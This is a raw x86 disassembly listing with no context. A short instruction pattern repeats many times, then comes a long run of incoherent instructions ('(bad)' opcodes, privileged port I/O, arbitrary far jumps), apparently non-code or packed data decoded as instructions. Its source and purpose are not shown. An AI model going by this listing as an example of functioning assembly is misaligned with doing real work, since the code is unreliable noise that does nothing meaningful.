  423344:	dec    ebx
  423345:	pop    eax
  423346:	push   0x789dd605
  42334b:	jg     0x42332b
  42334d:	pop    ebp
  42334e:	ror    BYTE PTR [ebx-0xa],cl
  423351:	dec    ebx
  423352:	pop    eax
  423353:	push   0x789dd605
  423358:	jg     0x423338
  42335a:	pop    ebp
  42335b:	ror    BYTE PTR [ebx-0xa],cl
  42335e:	dec    ebx
  42335f:	pop    eax
  423360:	push   0x789dd605
  423365:	jg     0x423345
  423367:	pop    ebp
  423368:	ror    BYTE PTR [ebx-0xa],cl
  42336b:	dec    ebx
  42336c:	pop    eax
  42336d:	push   0x789dd605
  423372:	jg     0x423352
  423374:	pop    ebp
  423375:	ror    BYTE PTR [ebx-0xa],cl
  423378:	dec    ebx
  423379:	pop    eax
  42337a:	push   0x789dd605
  42337f:	jg     0x42335f
  423381:	pop    ebp
  423382:	ror    BYTE PTR [ebx-0xa],cl
  423385:	dec    ebx
  423386:	pop    eax
  423387:	push   0x789dd605
  42338c:	jg     0x42336c
  42338e:	pop    ebp
  42338f:	ror    BYTE PTR [ebx-0xa],cl
  423392:	dec    ebx
  423393:	pop    eax
  423394:	push   0x789dd605
  423399:	jg     0x423379
  42339b:	pop    ebp
  42339c:	ror    BYTE PTR [ebx-0xa],cl
  42339f:	dec    ebx
  4233a0:	pop    eax
  4233a1:	push   0x789dd605
  4233a6:	jg     0x423386
  4233a8:	pop    ebp
  4233a9:	ror    BYTE PTR [ebx-0xa],cl
  4233ac:	dec    ebx
  4233ad:	pop    eax
  4233ae:	push   0x789dd605
  4233b3:	jg     0x423393
  4233b5:	pop    ebp
  4233b6:	ror    BYTE PTR [ebx-0xa],cl
  4233b9:	dec    ebx
  4233ba:	pop    eax
  4233bb:	push   0x789dd605
  4233c0:	jg     0x4233a0
  4233c2:	pop    ebp
  4233c3:	ror    BYTE PTR [ebx-0xa],cl
  4233c6:	dec    ebx
  4233c7:	pop    eax
  4233c8:	push   0x789dd605
  4233cd:	jg     0x4233ad
  4233cf:	pop    ebp
  4233d0:	ror    BYTE PTR [ebx-0xa],cl
  4233d3:	dec    ebx
  4233d4:	pop    eax
  4233d5:	push   0x789dd605
  4233da:	jg     0x4233ba
  4233dc:	pop    ebp
  4233dd:	ror    BYTE PTR [ebx-0xa],cl
  4233e0:	dec    ebx
  4233e1:	pop    eax
  4233e2:	push   0x789dd605
  4233e7:	jg     0x4233c7
  4233e9:	pop    ebp
  4233ea:	ror    BYTE PTR [ebx-0xa],cl
  4233ed:	dec    ebx
  4233ee:	pop    eax
  4233ef:	push   0x789dd605
  4233f4:	jg     0x4233d4
  4233f6:	pop    ebp
  4233f7:	ror    BYTE PTR [ebx-0xa],cl
  4233fa:	dec    ebx
  4233fb:	pop    eax
  4233fc:	push   0x789dd605
  423401:	jg     0x4233e1
  423403:	pop    ebp
  423404:	ror    BYTE PTR [ebx-0xa],cl
  423407:	dec    ebx
  423408:	pop    eax
  423409:	push   0x789dd605
  42340e:	jg     0x4233ee
  423410:	pop    ebp
  423411:	ror    BYTE PTR [ebx-0xa],cl
  423414:	dec    ebx
  423415:	pop    eax
  423416:	push   0x789dd605
  42341b:	jg     0x4233fb
  42341d:	pop    ebp
  42341e:	ror    BYTE PTR [ebx-0xa],cl
  423421:	dec    ebx
  423422:	pop    eax
  423423:	push   0x789dd605
  423428:	jg     0x423408
  42342a:	pop    ebp
  42342b:	ror    BYTE PTR [ebx-0xa],cl
  42342e:	dec    ebx
  42342f:	pop    eax
  423430:	push   0x789dd605
  423435:	jg     0x423415
  423437:	pop    ebp
  423438:	ror    BYTE PTR [ebx-0xa],cl
  42343b:	dec    ebx
  42343c:	pop    eax
  42343d:	push   0x789dd605
  423442:	jg     0x423422
  423444:	pop    ebp
  423445:	ror    BYTE PTR [ebx-0xa],cl
  423448:	dec    ebx
  423449:	pop    eax
  42344a:	push   0x789dd605
  42344f:	jg     0x42342f
  423451:	pop    ebp
  423452:	ror    BYTE PTR [ebx-0xa],cl
  423455:	dec    ebx
  423456:	pop    eax
  423457:	push   0x789dd605
  42345c:	jg     0x42343c
  42345e:	pop    ebp
  42345f:	ror    BYTE PTR [ebx-0xa],cl
  423462:	dec    ebx
  423463:	pop    eax
  423464:	push   0x789dd605
  423469:	jg     0x423449
  42346b:	pop    ebp
  42346c:	ror    BYTE PTR [ebx-0xa],cl
  42346f:	dec    ebx
  423470:	pop    eax
  423471:	push   0x789dd605
  423476:	jg     0x423456
  423478:	pop    ebp
  423479:	ror    BYTE PTR [ebx-0xa],cl
  42347c:	dec    ebx
  42347d:	pop    eax
  42347e:	push   0x789dd605
  423483:	jg     0x423463
  423485:	pop    ebp
  423486:	ror    BYTE PTR [ebx-0xa],cl
  423489:	dec    ebx
  42348a:	pop    eax
  42348b:	push   0x789dd605
  423490:	jg     0x423470
  423492:	pop    ebp
  423493:	ror    BYTE PTR [ebx-0xa],cl
  423496:	dec    ebx
  423497:	pop    eax
  423498:	push   0x78973842
  42349d:	push   eax
  42349e:	ficomp WORD PTR [ebp-0x3e]
  4234a1:	dec    ebx
  4234a2:	mul    BYTE PTR [ecx-0x6]
  4234a5:	mov    dl,0x74
  4234a7:	mov    al,0x62
  4234a9:	push   ebp
  4234aa:	loope  0x423505
  4234ac:	or     eax,0x581e7d3f
  4234b1:	in     al,dx
  4234b2:	std    
  4234b3:	arpl   WORD PTR [edi+0x6f6c2219],sp
  4234b9:	jmp    0xaed9:0xc11226c4
  4234c0:	sub    esi,DWORD PTR [ebp+ecx*1+0x12ed4647]
  4234c7:	arpl   WORD PTR [esp+edx*8+0x4b],bx
  4234cb:	jg     0x42349c
  4234cd:	lea    eax,[ebx-0x1329ea34]
  4234d3:	pusha  
  4234d4:	maxps  xmm0,XMMWORD PTR [edi+0x2b]
  4234d8:	dec    eax
  4234d9:	xor    esp,DWORD PTR [ebx]
  4234db:	(bad)  
  4234dc:	jb     0x4234ef
  4234de:	fidiv  WORD PTR [edx+0x316768ba]
  4234e4:	(bad)  
  4234e5:	or     al,0x96
  4234e7:	xor    esp,DWORD PTR [esi+0x7e7de150]
  4234ed:	xchg   esp,eax
  4234ee:	(bad)  
  4234ef:	fmul   QWORD PTR [edi+0x181d4474]
  4234f5:	xor    ebp,DWORD PTR [bx+0x6e4]
  4234fa:	sbb    bl,BYTE PTR [eax+0x3446bf47]
  423500:	ror    BYTE PTR [edi-0x66792a25],cl
  423506:	sub    DWORD PTR [eax-0x28],esp
  423509:	mov    al,cs:0xc5f69bfd
  42350f:	mov    dh,0x4b
  423511:	xor    edi,DWORD PTR [edx+edi*1]
  423514:	mov    edi,0xc8bd9b3b
  423519:	add    BYTE PTR [ebx-0x5b],0xd2
  42351d:	jbe    0x423512
  42351f:	loope  0x4234bb
  423521:	mov    edi,0x4cd53905
  423526:	jne    0x4234e3
  423528:	aad    0xf7
  42352a:	clc    
  42352b:	and    dh,BYTE PTR [edi]
  42352d:	loopne 0x42353b
  42352f:	push   ecx
  423530:	xchg   DWORD PTR [ebp-0x12954c61],esi
  423536:	or     al,0x57
  423538:	mov    edx,0x9c7bf32f
  42353d:	std    
  42353e:	int    0x36
  423540:	mov    esp,0xcd53baab
  423545:	out    0x1c,al
  423547:	in     al,dx
  423548:	jbe    0x4235ad
  42354a:	mov    esp,0x8fa1b619
  42354f:	neg    BYTE PTR [eax+0x56]
  423552:	and    dl,BYTE PTR [edi]
  423554:	repz aaa 
  423556:	(bad)  
  423557:	mov    cl,0x78
  423559:	or     al,0xde
  42355b:	lock aas 
  42355d:	dec    eax
  42355e:	imul   esi,DWORD PTR [ecx-0x7],0x77
  423562:	push   esp
  423563:	pop    es
  423564:	test   DWORD PTR [ebp-0x14],edx
  423567:	mov    BYTE PTR [ebx+ebx*1-0x585d408d],bh
  42356e:	add    eax,0x1a79e661
  423573:	sub    al,ch
  423575:	pop    es
  423576:	adc    al,0x34
  423578:	add    BYTE PTR [ebx],0x2b
  42357b:	or     cl,BYTE PTR [edi]
  42357d:	inc    ebx
  42357e:	data16 data16 jb 0x42358c
  423582:	inc    DWORD PTR [ecx-0x5b21b1e3]
  423588:	cdq    
  423589:	jbe    0x423514
  42358b:	fdiv   DWORD PTR [edx]
  42358d:	stc    
  42358e:	stos   BYTE PTR es:[edi],al
  42358f:	shl    BYTE PTR [edi+0x247b210d],0xbd
  423596:	push   cs
  423597:	imul   ecx,DWORD PTR [ebp+0x77],0x66f1c705
  42359e:	enter  0x7be0,0xf0
  4235a2:	cmc    
  4235a3:	neg    BYTE PTR ds:0x3e792c0e
  4235a9:	cs dec edx
  4235ab:	jno    0x423563
  4235ad:	out    dx,eax
  4235ae:	jns    0x4235d8
  4235b0:	fadd   QWORD PTR ds:0xc9dadcd5
  4235b6:	inc    esp
  4235b7:	das    
  4235b8:	xchg   al,bl
  4235ba:	inc    ebx
  4235bb:	loope  0x4235ee
  4235bd:	dec    edx
  4235be:	inc    ecx
  4235bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235c0:	in     eax,0xf6
  4235c2:	cwde   
  4235c3:	push   0xfffffff9
  4235c5:	and    BYTE PTR [eax],al
  4235c7:	sbb    al,0xac
  4235c9:	cmp    al,0xac
  4235cb:	mov    dh,0x52
  4235cd:	dec    edi
  4235ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235cf:	mov    eax,ds:0xa42e572d
  4235d4:	popf   
  4235d5:	jne    0x4235f8
  4235d7:	jno    0x42357d
  4235d9:	jnp    0x42355e
  4235db:	mov    eax,ds:0x20f031b9
  4235e0:	pop    esi
  4235e1:	scas   al,BYTE PTR es:[edi]
  4235e2:	js     0x423582
  4235e4:	(bad)  
  4235e6:	and    eax,DWORD PTR [esi]
  4235e8:	inc    ebp
  4235e9:	push   esp
  4235ea:	push   esp
  4235eb:	adc    BYTE PTR [ebx+0x4bbb9730],dl
  4235f1:	mov    ebx,DWORD PTR [ecx-0x1caf448]
  4235f7:	cdq    
  4235f8:	mov    ebx,0xbecab421
  4235fd:	mov    edx,0x7e83fcb
  423602:	jge    0x4235c1
  423604:	mov    BYTE PTR [ebp-0x33e8ea7c],bh
  42360a:	inc    ebp
  42360b:	mov    cl,0xd9
  42360d:	stc    
  42360e:	test   eax,0xf47bc446
  423613:	inc    ebx
  423614:	add    al,bl
  423616:	cdq    
  423617:	das    
  423618:	pushf  
  423619:	repnz xor eax,0xf20654c2
  42361f:	cmp    esp,ebx
  423621:	(bad)  
  423622:	push   esp
  423623:	sahf   
  423624:	je     0x42363d
  423626:	mov    dh,0x76
  423628:	test   DWORD PTR [ebp+eiz*4-0x6],edx
  42362c:	fistp  WORD PTR [ebx+0x1a560647]
  423632:	cmovbe esi,esp
  423635:	das    
  423636:	sub    al,0xdf
  423638:	mov    eax,ds:0x812ab0f5
  42363d:	bound  edi,QWORD PTR ds:0xbedc6f9c
  423643:	aaa    
  423644:	lock pop esi
  423646:	xor    BYTE PTR [ecx],0x27
  423649:	ins    DWORD PTR es:[edi],dx
  42364a:	enter  0x33cd,0xb
  42364e:	sbb    al,0x73
  423650:	jecxz  0x4235e9
  423652:	adc    esp,DWORD PTR [edx-0x6]
  423655:	popf   
  423656:	lea    esp,[eax-0x607c890]
  42365c:	add    BYTE PTR [ecx+ebp*4-0x1297d84f],ah
  423663:	fimul  WORD PTR [ebx-0x1ae30593]
  423669:	rol    BYTE PTR [edi+0x3219e373],cl
  42366f:	xchg   eax,esi
  423671:	mov    ds:0xbce0605c,al
  423676:	mov    edi,0xbd7751ee
  42367b:	aaa    
  42367c:	add    DWORD PTR [esi],0xffffff8a
  42367f:	sub    bh,0x26
  423682:	ret    
  423683:	pop    edi
  423684:	inc    ebp
  423685:	dec    esp
  423686:	scas   eax,DWORD PTR es:[edi]
  423687:	in     eax,0x82
  423689:	gs jnp 0x4236d1
  42368c:	ret    
  42368d:	push   esi
  42368e:	stos   BYTE PTR es:[edi],al
  42368f:	fcomp  QWORD PTR [ecx+0x63261c44]
  423695:	ret    
  423696:	icebp  
  423697:	lock mov ah,bh
  42369a:	push   ebp
  42369b:	push   cs
  42369c:	push   ss
  42369d:	lds    esi,FWORD PTR [edx-0x3546fb32]
  4236a3:	pop    ebp
  4236a4:	outs   dx,DWORD PTR ds:[esi]
  4236a5:	inc    esp
  4236a6:	lds    ecx,FWORD PTR [ecx-0x218e5f86]
  4236ac:	push   ds
  4236ad:	sbb    eax,0xe45e736c
  4236b2:	popa   
  4236b3:	repz mov ds:0x94dfa81d,al
  4236b9:	stc    
  4236ba:	xchg   DWORD PTR [edi+0x6d],ebp
  4236bd:	dec    esp
  4236be:	sub    BYTE PTR [esi-0x7fc92138],0x7
  4236c5:	jmp    0x42370a
  4236c7:	jl     0x423732
  4236c9:	stos   DWORD PTR es:[edi],eax
  4236ca:	aam    0x2e
  4236cc:	xor    eax,0x2668eadb
  4236d1:	mov    cl,0xb2
  4236d3:	push   ds
  4236d4:	aaa    
  4236d5:	or     bl,BYTE PTR [edi]
  4236d7:	pop    es
  4236d8:	jle    0x423748
  4236da:	mov    eax,ds:0x3e277631
  4236df:	leave  
  4236e0:	add    al,0xc2
  4236e2:	int3   
  4236e3:	int    0x29
  4236e5:	cmp    al,0x2c
  4236e7:	outs   dx,DWORD PTR ds:[esi]
  4236e8:	adc    edi,DWORD PTR [ecx]
  4236ea:	xchg   ecx,eax
  4236eb:	xchg   ecx,eax
  4236ec:	xchg   BYTE PTR [esi+0x65],cl
  4236ef:	fcom   DWORD PTR [eax-0x62]
  4236f2:	hlt    
  4236f3:	xor    BYTE PTR [eax-0x289be4f1],0x36
  4236fa:	gs or  eax,0x85e835b4
  423700:	mov    eax,ds:0xd94ecd66
  423705:	sub    esi,esi
  423707:	push   ecx
  423708:	push   esp
  423709:	cmp    BYTE PTR [esp+esi*1],dl
  42370c:	cdq    
  42370d:	mov    ds:0x1e113620,al
  423712:	add    ecx,DWORD PTR [edx+0x64]
  423715:	icebp  
  423716:	das    
  423717:	out    dx,al
  423718:	repz lahf 
  42371a:	cmovge esi,DWORD PTR [esi-0x7135a4cf]
  423721:	jne    0x4236a5
  423723:	jle    0x423763
  423725:	nop
  423726:	loopne 0x423730
  423728:	mov    dh,0xc4
  42372a:	xchg   BYTE PTR [edi-0x23],al
  42372d:	or     esi,ecx
  42372f:	push   ebp
  423730:	sub    al,0x2c
  423732:	in     ax,dx
  423734:	dec    esi
  423735:	mov    al,BYTE PTR [eax+0x5a633af7]
  42373b:	std    
  42373c:	push   ecx
  42373d:	ret    
  42373e:	cmp    BYTE PTR [ebp-0x3bfd4629],al
  423744:	pop    esp
  423745:	scas   eax,DWORD PTR es:[edi]
  423746:	or     al,0xcf
  423748:	(bad)  
  423749:	jae    0x42377c
  42374b:	ret    0xdcfe
  42374e:	test   BYTE PTR [eax-0xf],ah
  423751:	ret    0x4dda
  423754:	cwde   
  423755:	mov    ebp,0xc351c1e
  42375a:	xchg   ebp,eax
  42375b:	je     0x423752
  42375d:	aad    0x64
  42375f:	mov    esi,0x823a2c04
  423764:	gs in  al,0x4a
  423767:	jecxz  0x42372c
  423769:	cmp    dh,BYTE PTR [edi+0x1e]
  42376c:	add    ebx,DWORD PTR [ebp-0x40]
  42376f:	jg     0x4237db
  423771:	mov    ecx,0xf82b1093
  423776:	jne    0x423795
  423778:	leave  
  423779:	jmp    0x6197b7f
  42377e:	sbb    DWORD PTR [edi],ebp
  423780:	adc    BYTE PTR ds:[edx],0x92
  423784:	test   al,0x22
  423786:	pop    ss
  423787:	and    DWORD PTR [edi-0x6e141f01],eax
  42378d:	push   ecx
  42378e:	inc    esp
  42378f:	stos   BYTE PTR es:[edi],al
  423790:	xchg   ebp,eax
  423791:	jae    0x4237d6
  423793:	sbb    BYTE PTR [esi+ebx*2+0x76f64201],ch
  42379a:	push   ss
  42379b:	add    ecx,ebp
  42379d:	fldenv [edi]
  42379f:	jl     0x423783
  4237a1:	or     ch,0xd7
  4237a4:	xor    DWORD PTR [edx-0x18a5b44],ecx
  4237aa:	add    ebx,DWORD PTR [edi-0x3e]
  4237ad:	pop    ebp
  4237ae:	cmp    cl,bl
  4237b0:	mov    eax,0xc1755c01
  4237b5:	cli    
  4237b6:	add    al,0xf0
  4237b8:	or     bh,BYTE PTR ds:0xcf054162
  4237be:	sub    BYTE PTR [ebp+0x6f],bh
  4237c1:	addr16 aas 
  4237c3:	imul   ebx,esi,0x31
  4237c6:	push   ecx
  4237c7:	inc    edi
  4237c8:	add    eax,0x2b34e6e3
  4237cd:	lock addr16 loopne 0x423805
  4237d1:	inc    esi
  4237d2:	loope  0x42379f
  4237d4:	mov    ebp,0xcd784d14
  4237d9:	popf   
  4237da:	es es jle 0x4237b5
  4237de:	push   ecx
  4237df:	stos   DWORD PTR es:[edi],eax
  4237e0:	mov    ch,BYTE PTR [ebp+0x11]
  4237e3:	pop    eax
  4237e4:	imul   eax,DWORD PTR [esi-0x36],0xbc58e834
  4237eb:	pop    ds
  4237ec:	push   cs
  4237ed:	jae    0x42386b
  4237ef:	out    dx,eax
  4237f0:	push   ebx
  4237f1:	adc    DWORD PTR [ebx-0x4cf23a03],0x2a
  4237f8:	xchg   ebx,eax
  4237f9:	inc    ebx
  4237fa:	inc    ebp
  4237fb:	push   esi
  4237fc:	cmp    esp,ecx
  4237fe:	pop    ss
  4237ff:	in     al,0xeb
  423801:	std    
  423802:	inc    esi
  423803:	jmp    0xe363:0x654bcf9e
  42380a:	xchg   ebp,eax
  42380b:	loop   0x4237e3
  42380d:	mov    fs,WORD PTR [esi-0x60ce5ac8]
  423813:	imul   ecx,edx,0xffffffc9
  423816:	cmp    eax,0xa18d24f8
  42381b:	mov    bh,0x65
  42381d:	sbb    ebx,edx
  42381f:	cld    
  423820:	adc    al,0xf
  423822:	lea    ebp,[ebx+0x454d8178]
  423828:	cmp    eax,0x68bf250f
  42382d:	cmp    DWORD PTR [eax],0x64
  423830:	lock add DWORD PTR [edx+ecx*1-0x16],edx
  423835:	xchg   DWORD PTR ds:0x335e716f,ebx
  42383b:	cs sbb al,0xfd
  42383e:	mov    ds:0x98a08d58,eax
  423843:	addr16 dec eax
  423845:	jle    0x42384f
  423847:	adc    DWORD PTR [esp+ebp*4],edx
  42384a:	das    
  42384b:	ds out dx,eax
  42384d:	xchg   edi,eax
  42384e:	ds aam 0xc7
  423851:	sub    dh,BYTE PTR [esi]
  423853:	test   DWORD PTR [edx],0xe9af4023
  423859:	fisttp WORD PTR [ebx-0x6f]
  42385c:	(bad)  
  42385d:	mov    ebp,0x101385b5
  423862:	fstp   QWORD PTR [ebx]
  423864:	outs   dx,BYTE PTR ds:[esi]
  423865:	ficom  DWORD PTR [ecx-0x30dd017b]
  42386b:	lea    eax,[edi+0x43]
  42386e:	dec    esi
  42386f:	sbb    DWORD PTR [esi+edx*8-0x323c6e01],esi
  423876:	or     BYTE PTR [ebx+0x13787730],0x7e
  42387d:	fwait
  42387e:	test   DWORD PTR [ecx],eax
  423880:	adc    al,0x95
  423882:	jns    0x423813
  423884:	inc    esi
  423885:	lea    ecx,[ebp-0x5c]
  423888:	inc    ebx
  423889:	or     esp,DWORD PTR [ebp-0x60]
  42388c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42388d:	dec    esp
  42388e:	lock int 0xa6
  423891:	test   al,0x9b
  423893:	and    BYTE PTR [ebp-0x608d635d],0xe
  42389a:	adc    eax,0x8a3211d8
  42389f:	mov    fs,WORD PTR [ebx-0x14]
  4238a2:	stc    
  4238a3:	dec    ebp
  4238a4:	call   0x70154704
  4238a9:	xor    BYTE PTR [ebx],bl
  4238ab:	inc    ebx
  4238ac:	mov    ss,esp
  4238ae:	shr    DWORD PTR [ebx+0x28],1
  4238b1:	fdiv   QWORD PTR [ebx-0x13]
  4238b4:	lahf   
  4238b5:	loope  0x4238c5
  4238b7:	inc    edi
  4238b8:	mov    WORD PTR [eax],gs
  4238ba:	sub    ebp,edx
  4238bc:	xor    edx,DWORD PTR [esi-0x313f7f46]
  4238c2:	sub    ebx,0x734968e8
  4238c8:	bound  esp,QWORD PTR [esi+ebp*8]
  4238cb:	ss xchg edi,eax
  4238cd:	lods   eax,DWORD PTR ds:[esi]
  4238ce:	push   esp
  4238cf:	jmp    0x205b:0x84a58b02
  4238d6:	push   ds
  4238d7:	(bad)  
  4238d8:	ret    0x286e
  4238db:	cmp    bl,BYTE PTR [edx+0x5a08cd2e]
  4238e1:	mov    ebp,0x2faf1af1
  4238e6:	rcl    esp,cl
  4238e8:	jmp    0x7851:0x538cf1d1
  4238ef:	push   esi
  4238f0:	sbb    cl,dl
  4238f2:	sti    
  4238f3:	dec    edx
  4238f4:	scas   eax,DWORD PTR es:[edi]
  4238f5:	xchg   ebx,eax
  4238f6:	mov    eax,esi
  4238f8:	sub    eax,0x5974a86a
  4238fd:	cli    
  4238fe:	pusha  
  4238ff:	cmc    
  423900:	daa    
  423901:	popf   
  423902:	add    ecx,esp
  423904:	mov    edi,0x42fa8220
  423909:	push   ss
  42390a:	sub    ecx,DWORD PTR [edx]
  42390c:	lock in al,0x89
  42390f:	pop    edx
  423910:	push   0x6f1b565d
  423915:	fidiv  WORD PTR [edi+0x6]
  423918:	std    
  423919:	xor    dh,BYTE PTR [ecx-0x248c0d8c]
  42391f:	mov    ebx,0xf6b44f40
  423924:	loopne 0x4238cf
  423926:	dec    edi
  423927:	pop    esp
  423928:	jns    0x42395e
  42392a:	not    DWORD PTR [ecx]
  42392c:	(bad)  
  42392d:	adc    al,dh
  42392f:	imul   edx,DWORD PTR [eax+eax*2],0x6af71c6d
  423936:	out    0x48,al
  423938:	fwait
  423939:	jne    0x423913
  42393b:	mov    ecx,0xa6d1e5c8
  423940:	aam    0xfa
  423942:	adc    BYTE PTR [esi+0x14],ah
  423945:	pop    ecx
  423946:	push   ss
  423947:	sub    edi,edi
  423949:	lods   al,BYTE PTR ds:[esi]
  42394a:	xchg   ecx,eax
  42394b:	fsubr  st,st(6)
  42394d:	add    DWORD PTR [ecx-0x79],ecx
  423950:	cdq    
  423951:	fadd   st(6),st
  423953:	push   esp
  423954:	sbb    DWORD PTR [edx],ecx
  423956:	xor    BYTE PTR [ebx],bh
  423958:	ins    DWORD PTR es:[edi],dx
  423959:	sar    ebp,1
  42395b:	mov    edx,0x2b12c43f
  423960:	mov    ds:0x963f4d33,eax
  423965:	inc    ebx
  423966:	sahf   
  423967:	pop    ebp
  423968:	ficom  DWORD PTR [edx]
  42396a:	xlat   BYTE PTR ds:[ebx]
  42396b:	fwait
  42396c:	adc    eax,0x8c8ba67
  423971:	pop    ebp
  423972:	out    0x4b,al
  423974:	xor    ecx,esp
  423976:	mov    eax,ds:0xecffc83
  42397b:	pop    es
  42397c:	adc    edi,edx
  42397e:	retf   
  42397f:	mov    edi,0x298c3feb
  423984:	rol    ah,cl
  423986:	adc    al,0x40
  423988:	arpl   WORD PTR [ecx-0x78ce6a4d],cx
  42398e:	test   al,0x25
  423990:	add    bl,dl
  423992:	cmp    eax,0xf6507fc8
  423997:	clc    
  423998:	pop    ebx
  423999:	and    eax,esp
  42399b:	stos   DWORD PTR es:[edi],eax
  42399c:	dec    ebp
  42399d:	xor    edx,DWORD PTR [ebx+0x19]
  4239a0:	dec    edi
  4239a1:	popa   
  4239a2:	ds dec ebp
  4239a4:	in     eax,0xdb
  4239a6:	outs   dx,DWORD PTR ds:[esi]
  4239a7:	sub    eax,0x331faec1
  4239ac:	adc    ah,dh
  4239ae:	fbld   TBYTE PTR [esi+0x5e7bef92]
  4239b4:	repnz jmp 0xacab:0x25f0cab8
  4239bc:	rol    ebp,cl
  4239be:	lahf   
  4239bf:	fidiv  WORD PTR [edx-0x46]
  4239c2:	inc    ecx
  4239c3:	dec    esi
  4239c4:	(bad)  
  4239c5:	fild   QWORD PTR [edx]
  4239c7:	int    0x90
  4239c9:	imul   edi,DWORD PTR [eax-0x4f68fd1f],0xfc713fd0
  4239d3:	mov    cl,0xa5
  4239d5:	lods   al,BYTE PTR ds:[esi]
  4239d6:	out    0xae,al
  4239d8:	popf   
  4239d9:	jno    0x423a09
  4239db:	add    DWORD PTR [ebx],esp
  4239dd:	mov    ecx,0x93f8caab
  4239e2:	lock shl BYTE PTR [edi],cl
  4239e5:	out    dx,eax
  4239e6:	outs   dx,BYTE PTR ds:[esi]
  4239e7:	clc    
  4239e8:	jge    0x4239dd
  4239ea:	inc    edi
  4239eb:	jns    0x42396d
  4239ed:	pop    eax
  4239ee:	adc    ebx,DWORD PTR [esi]
  4239f0:	rcr    DWORD PTR [ebp+ebx*2-0x70],1
  4239f4:	ja     0x423a4d
  4239f6:	lock jno 0x423a56
  4239f9:	dec    ebp
  4239fa:	stos   DWORD PTR es:[edi],eax
  4239fb:	fild   QWORD PTR [ecx]
  4239fd:	sub    bh,dh
  4239ff:	ret    
  423a00:	ins    DWORD PTR es:[edi],dx
  423a01:	or     esi,edx
  423a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a04:	outs   dx,BYTE PTR ds:[esi]
  423a05:	imul   esi,ebp,0x6a
  423a08:	scas   al,BYTE PTR es:[edi]
  423a09:	sar    BYTE PTR [edi-0x60],cl
  423a0c:	add    edi,DWORD PTR [ebx]
  423a0e:	inc    esi
  423a0f:	pop    ecx
  423a10:	mov    es,WORD PTR [esi+0x69]
  423a13:	xor    eax,0x335bce95
  423a18:	xor    BYTE PTR [ecx+ebx*8+0x79e052de],cl
  423a1f:	adc    esp,0xa927d4f1
  423a25:	dec    edi
  423a26:	mov    esp,0x8c683d7c
  423a2b:	mov    al,BYTE PTR [ecx+0x2a2979dc]
  423a31:	scas   al,BYTE PTR es:[edi]
  423a32:	loop   0x4239c9
  423a34:	in     al,dx
  423a35:	add    esp,DWORD PTR [ebx+0x53]
  423a38:	jle    0x423a93
  423a3a:	mov    ds:0xe69a31d4,eax
  423a3f:	xlat   BYTE PTR ds:[ebx]
  423a40:	cdq    
  423a41:	in     al,0x5e
  423a43:	mov    ah,0x25
  423a45:	ror    DWORD PTR [edx+0x57],cl
  423a48:	pop    edi
  423a49:	rcl    edi,1
  423a4b:	mov    dl,0xfe
  423a4d:	xchg   esp,eax
  423a4e:	xor    BYTE PTR [edx+ecx*8],dh
  423a51:	rcl    BYTE PTR [esi],0x4d
  423a54:	mov    esp,0x8b142707
  423a59:	fs hlt 
  423a5b:	mov    cl,0x45
  423a5d:	ss jmp 0xa7c12b78
  423a63:	xchg   BYTE PTR [eax-0x3078521],cl
  423a69:	leave  
  423a6a:	into   
  423a6b:	ds pop esp
  423a6d:	imul   ecx,edx,0xa8d562b4
  423a73:	hlt    
  423a74:	(bad)  
  423a75:	imul   esp,DWORD PTR [edx+0x5e],0x52
  423a79:	xchg   BYTE PTR [ebx+0x4a759848],bh
  423a7f:	pop    esi
  423a80:	add    edi,DWORD PTR [edx]
  423a82:	neg    esi
  423a84:	in     al,dx
  423a85:	adc    eax,DWORD PTR [edi-0x65]
  423a88:	jbe    0x423ac0
  423a8a:	je     0x423a88
  423a8c:	push   esp
  423a8d:	jns    0x423a60
  423a8f:	jnp    0x423afd
  423a91:	sbb    eax,0xe005358b
  423a96:	push   ds
  423a97:	fisub  WORD PTR [edx-0x3839744f]
  423a9d:	mov    esi,0xcb800bf3
  423aa2:	xchg   esi,eax
  423aa3:	inc    edx
  423aa4:	scas   eax,DWORD PTR es:[edi]
  423aa5:	js     0x423add
  423aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aa9:	cmp    al,0xc2
  423aab:	ins    BYTE PTR es:[edi],dx
  423aac:	sbb    DWORD PTR [ecx-0x36],esi
  423aaf:	imul   ebp,DWORD PTR [esi+0x36],0xffffffc9
  423ab3:	push   esi
  423ab4:	adc    BYTE PTR fs:[ebx+eiz*1-0x41fe162f],al
  423abc:	xor    al,0x17
  423abe:	ret    
  423abf:	sub    al,0x29
  423ac1:	dec    esi
  423ac2:	xor    eax,0x2f7e4e68
  423ac7:	mov    al,0x4f
  423ac9:	cmp    eax,0x5021f29f
  423ace:	mov    ebp,0x1f86047f
  423ad3:	add    BYTE PTR [edx-0x5a09bd42],dh
  423ad9:	fstp   TBYTE PTR [ebp-0x774f9ef0]
  423adf:	mov    eax,ds:0xbb86c537
  423ae4:	shr    BYTE PTR [eax+0xe5fe017],1
  423aea:	pop    ds
  423aeb:	xchg   edx,eax
  423aec:	imul   eax,DWORD PTR [eax-0x71b8e7ff],0xffffff95
  423af3:	push   0x5a
  423af5:	repnz fsubr DWORD PTR [eax+ebp*4+0x6b22576d]
  423afd:	push   edx
  423afe:	daa    
  423aff:	fwait
  423b00:	ins    BYTE PTR es:[edi],dx
  423b01:	cld    
  423b02:	pop    ecx
  423b03:	sbb    DWORD PTR [edi+0x7f],ecx
  423b06:	cld    
  423b07:	lock mov cl,0x75
  423b0a:	or     edi,DWORD PTR [eax+esi*4]
  423b0d:	pushf  
  423b0e:	in     al,dx
  423b0f:	jle    0x423b3a
  423b11:	repz xchg esi,eax
  423b13:	sar    esp,cl
  423b15:	xchg   esp,eax
  423b16:	in     al,dx
  423b17:	out    dx,eax
  423b18:	add    DWORD PTR [esi-0x6e],0xfffffff4
  423b1c:	push   cs
  423b1d:	sub    dh,BYTE PTR [esi+0x376fca01]
  423b23:	pop    ds
  423b24:	xchg   ecx,eax
  423b25:	dec    edi
  423b26:	pop    ebx
  423b27:	xchg   esp,eax
  423b28:	aas    
  423b29:	rcr    BYTE PTR [ebx-0x871c3ca],1
  423b2f:	mov    ah,0x2b
  423b31:	and    ecx,esi
  423b33:	retf   
  423b34:	xor    dl,cl
  423b36:	jnp    0x423b6f
  423b38:	inc    eax
